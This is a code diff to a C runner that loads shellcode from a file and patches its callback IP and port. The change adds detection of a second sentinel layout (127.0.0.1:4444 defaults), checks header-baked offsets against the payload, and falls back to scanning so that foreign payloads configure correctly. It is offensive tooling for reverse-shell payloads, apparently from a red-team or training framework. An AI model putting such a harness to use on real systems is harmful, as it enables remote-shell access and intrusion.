@@ -66,8 +66,12 @@ static uint8_t *load_file(const char *path, size_t *out_size)
 }
 
 /*
- * Scan the binary for config sentinel values (default IP 127.0.0.1
- * followed immediately by default port 4444 = 0x11 0x5C).
+ * Scan the binary for config sentinel values. Two layouts exist:
+ *  1. 16-byte struct sockaddr_in at the data tail (sqpoll_min.asm):
+ *     family+port+addr byte run (8 bytes); port = ip - 2.
+ *  2. adjacent _config_ip + _config_port labels (combined/shellcode.asm
+ *     and all builder missions): default IP 127.0.0.1 followed by
+ *     default port 4444 = 0x11 0x5C; port = ip + 4.
  * Search only in the last 25% of the binary (data section).
  */
 static int scan_offsets(const uint8_t *data, size_t size,
@@ -79,6 +83,10 @@ static int scan_offsets(const uint8_t *data, size_t size,
     static const uint8_t DEFAULT_SA[8] = {0x02, 0x00, 0x11, 0x5C,
                                           127, 0, 0, 1};
 
+    /* Builder/combined sentinel: _config_ip directly followed by
+     * _config_port (127.0.0.1 + 4444 big-endian); port = ip + 4. */
+    static const uint8_t DEFAULT_IP_PORT[6] = {127, 0, 0, 1, 0x11, 0x5C};
+
     size_t from = size * 3 / 4;
     for (size_t i = from; i + 8 <= size; i++) {
         if (memcmp(data + i, DEFAULT_SA, 8) == 0) {
@@ -87,7 +95,31 @@ static int scan_offsets(const uint8_t *data, size_t size,
             return 1;
         }
     }
+    for (size_t i = from; i + 6 <= size; i++) {
+        if (memcmp(data + i, DEFAULT_IP_PORT, 6) == 0) {
+            *ip_off   = (int)i;
+            *port_off = (int)i + 4;
+            return 1;
+        }
+    }
     return 0;
+}
+
+/*
+ * True when the default config sentinel sits exactly at the given
+ * offsets — used to sanity-check header-baked offsets against the
+ * payload actually being run (the header describes whichever binary
+ * was around when the runner was compiled).
+ */
+static int default_config_at(const uint8_t *d, size_t n,
+                             int ip_off, int port_off)
+{
+    static const uint8_t IP[4] = {127, 0, 0, 1};
+    static const uint8_t PORT[2] = {0x11, 0x5C};
+    return ip_off >= 0 && port_off >= 0
+        && (size_t)ip_off + 4 <= n && (size_t)port_off + 2 <= n
+        && memcmp(d + ip_off, IP, 4) == 0
+        && memcmp(d + port_off, PORT, 2) == 0;
 }
 
 static void patch_ip(uint8_t *sc, size_t size, const char *ip_str, int offset)
@@ -165,9 +197,19 @@ int main(int argc, char *argv[])
     uint8_t *sc = load_file(argv[1], &sc_size);
     fprintf(stderr, "[*] Loaded %zu bytes from %s\n", sc_size, argv[1]);
 
-    /* Resolve config offsets: header > runtime scan */
+    /* Resolve config offsets: header > runtime scan. Header values are
+     * baked at runner build time and describe that binary — if the
+     * payload being run doesn't carry the default sentinel there, fall
+     * back to a scan so foreign payloads patch correctly too. */
     int ip_off   = CONFIG_IP_OFFSET;
     int port_off = CONFIG_PORT_OFFSET;
+
+    if (ip_off >= 0 && port_off >= 0 &&
+        !default_config_at(sc, sc_size, ip_off, port_off)) {
+        fprintf(stderr,
+                "[!] Header offsets don't match this payload — scanning\n");
+        ip_off = port_off = -1;
+    }
 
     if ((ip_off < 0 || port_off < 0) &&
         !scan_offsets(sc, sc_size, &ip_off, &port_off)) {
